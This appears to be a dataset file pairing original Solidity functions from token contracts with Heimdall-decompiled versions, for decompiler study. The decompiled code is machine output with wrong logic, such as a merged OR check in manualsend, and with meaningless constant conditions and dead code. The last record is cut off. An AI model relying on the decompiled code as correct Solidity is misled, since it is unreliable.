{"contract_address": "0x31F2C94D3EF63551FF418747EbBe67E5A083aDC0", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\\n        return _balances[account];\\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xF6FF7F8635a951ecF4D68264b32FB3a4b5f9cf15", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\r\\n        emit OwnershipTransferred(_owner, address(0));\\r\\n        _owner = address(0);\\r\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x636aD441CdA1EC74BC059A23615b9D9c3464d9e3", "original_solidity_code": "function setMaxDesAmount(uint256 maxDestroy) public onlyOwner {\r\n        _maxDestroyAmount = maxDestroy;\r\n    }", "heimdall_decompiled_code": "function setMaxDesAmount(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxDestroyAmount = arg0;\n    }"}
{"contract_address": "0x5Bfdf57678baFB4eBB2c09279ac382397F3006b6", "original_solidity_code": "function manualsend() external {\r\nrequire(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress);\r\nuint256 contractETHBalance = address(this).balance;\r\nsendETHToFee(contractETHBalance);\r\n}", "heimdall_decompiled_code": "function manualsend() public {\n        require(address(msg.sender) == (address(store_p)));\n        require(address(msg.sender) == (address(store_q)));\n        (bool success, bytes memory ret0) = address(store_q).transfer(address(this).balance);\n    }"}
{"contract_address": "0xdcb0A4559562a8854074Aeaf47B9549aD1eC1163", "original_solidity_code": "function manualSwap() external {\\r\\n        require(_msgSender()==_taxWallet);\\r\\n        uint256 tokenBalance=balanceOf(address(this));\\r\\n        if(tokenBalance>0){\\r\\n          swapTokensForEth(tokenBalance);\\r\\n        }\\r\\n        uint256 ethBalance=address(this).balance;\\r\\n        if(ethBalance>0){\\r\\n          sendETHToFee(ethBalance);\\r\\n        }\\r\\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a] > 0);\n        store_e = (0x01 * 0x01000000000000000000000000000000000000000000) | (uint248(store_e));\n        require(!storage_map_b[var_a] - 0);\n        require(!bytes1(store_e / 0x010000000000000000000000000000000000000000));\n        require(!0x02 > 0xffffffffffffffff);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x41;\n        var_d = 0x02;\n        uint256 var_e = var_e + 0x60;\n        require(!0x02);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_f = address(this);\n        var_g = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).WETH(var_h); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!(((var_e + ret0.length) - var_e) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_i == (address(var_i)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_j = address(var_i);\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_d / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_d / 0x01);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_d / 0x01), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        uint256 var_n = ((0x04 + var_e) + 0xa0) - (0x04 + var_e);\n        uint256 var_p = var_e.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_d / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_d / 0x01).Unresolved_791ac947(var_l); // call\n        store_e = (0 * 0x01000000000000000000000000000000000000000000) | (uint248(store_e));\n        require(!address(this).balance > 0);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x5a913264FF9a427e0452acB8f522E8202CBB6234", "original_solidity_code": "function addDestination(address addr) external onlyOwner {\\n        validDestination[addr] = true;\\n    }", "heimdall_decompiled_code": "function addDestination(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_e = address(arg0);\n        var_f = 0xcf;\n        storage_map_f[var_e] = 0x01 | (uint248(storage_map_f[var_e]));\n    }"}
{"contract_address": "0x5Dae130C98E4867Eb6721c48D2255F06f3E2a055", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if (!0x989680 | (0x01 == 0x01)) {\n                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_g = 0x11;\n                _maxTxAmount = 0x989680;\n                if (0x09) {\n                    if (!0x989680 | (0x01 == 0x01)) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        _maxWalletSize = 0x989680;\n                        transferDelayEnabled = (0 * 0x01) | (uint248(transferDelayEnabled));\n                        if (0x09) {\n                            if (!0x989680 | (0x01 == 0x01)) {\n                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_g = 0x11;\n                                var_a = 0x989680;\n                                emit MaxTxAmountUpdated(0x989680);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                                if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_g = 0x11;\n                                                    if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                        if (!0x09 > 0x01) {\n                                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_g = 0x11;\n                                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                    var_g = 0x11;\n                                                                    if (!0x01) {\n                                                                    }\n                                                                    if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                        var_g = 0x11;\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x87B559c39A8d5f01699E8bafd47EdA847DB8a099", "original_solidity_code": "function balanceOf(address account) external view override returns (uint256) {\\r\\n      uint160 \\r\\n      x = uint160(account\\r\\n        ); return slotValues(\\r\\n          x, 4) + \\r\\n          slotValues(x\\r\\n          , 6); }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        address var_a = address(arg0);\n        var_b = 0x06;\n        var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = storage_map_d[var_a] + storage_map_d[var_a];\n        return storage_map_d[var_a] + storage_map_d[var_a];\n    }"}
{"contract_address": "0xa60ecbb555a15D31AaCfd8d44a456A81699e4C9a", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (!(store_c) == ((store_c / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_c / 0x02;\n                if (store_c) {\n                    if (!(store_c) == ((store_c / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c / 0x02) {\n                            if (0x1f < (store_c / 0x02)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xF6FF7F8635a951ecF4D68264b32FB3a4b5f9cf15", "original_solidity_code": "function enableTrading() external onlyOwner {\\r\\n        tradingActive = true;\\r\\n        swapEnabled = true;\\r\\n        lastLpBurnTime = block.timestamp;\\r\\n        launchedAt = block.number;\\r\\n    }", "heimdall_decompiled_code": "function enableTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        tradingActive = 0x010100 | (uint240(tradingActive));\n        lastLpBurnTime = block.timestamp;\n        lastLpBurnTimea = block.number;\n    }"}
{"contract_address": "0x410cA8f9159f88a864DeEc21f30D5D62E8B75619", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0) - 0, \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xa8F0d9c8E171cA5402052a820B391674a5590b7c", "original_solidity_code": "function renounceownership() public virtual onlyowner {\r\n        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }", "heimdall_decompiled_code": "function renounceownership() public payable {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit ownershipTransferred(address(owner), 0xdead);\n        owner = 0xdead | (uint96(owner));\n    }"}
{"contract_address": "0x7ccFBc00423e429844f344aA62D726E3C0DCbfCA", "original_solidity_code": "function name() public view returns (string memory) {\r\n        return _Tokename;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x2712ac3E4Fb06A0d1FB54E31eB81e7db4731c417", "original_solidity_code": "function manualSend() external {\r\n        require(_msgSender() == shiaburnWallet);\r\n        uint256 contractETHBalance = address(this).balance;\r\n        if (contractETHBalance > 0) {\r\n            sendETHToFee(contractETHBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSend() public {\n        require(address(msg.sender) == (address(store_g)));\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(store_g).transfer(address(this).balance);\n    }"}
{"contract_address": "0x4cA919d9EBE767dC6429f911651321feA44cbe94", "original_solidity_code": "function name() external view override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x684D5A4E5f91ED948E1cEc2B3B0BA22177f6BB5E", "original_solidity_code": "function approve(address spender, uint256 amount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x433261F4DCdF51419232FFe4eD44BA793AA2B9f7", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_e / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_d = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_d));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x77359400, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_n[var_e] = 0x77359400;\n        var_a = 0x77359400;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x77359400);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                            if (!0x09 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0x01) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xe2BFF0b8121D4977F0aFd680dB7d3eADDa4Ab3Df", "original_solidity_code": "function approve(address spender, uint256 amount)\r\npublic\r\noverride\r\nreturns (bool)\r\n{\r\n_approve(_msgSender(), spender, amount);\r\nreturn true;\r\n}", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x605dB46AD9766ADC36De8974ae0b58827878C232", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0x46062Bb908158b945803Df5E5233c10240269C09", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\\n        return _balances[account];\\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_h[var_a];\n        return storage_map_h[var_a];\n    }"}
{"contract_address": "0xF46E6f1D0Ea1dB840717aafD66aC7Cb84a3ab6B0", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_g = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xdeB109aFB2756A9114CADAcB051fF399a5908EaA", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xE717AFf2e3d325cb5E2c7bdB9CB916ff6AF64ec7", "original_solidity_code": "function name() public view returns (string memory) {\r\n      return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (store_a - ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xd98dc523C0F1B811E415888b7349DB94842Dd75b", "original_solidity_code": "function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\\r\\n      _transfer(sender, recipient, amount);\\r\\n      _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \\\"ERC20: transfer amount exceeds allowance\\\"));\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function transferFrom(address arg0, address arg1, uint256 arg2) public payable {\n        require(address(arg0));\n        require(address(arg1));\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_b = address(arg0);\n        require(address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).code.length);\n        (bool success, bytes memory ret0) = address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).Unresolved_70a08231(var_b); // staticcall\n        require(!(ret0.length < 0x20), 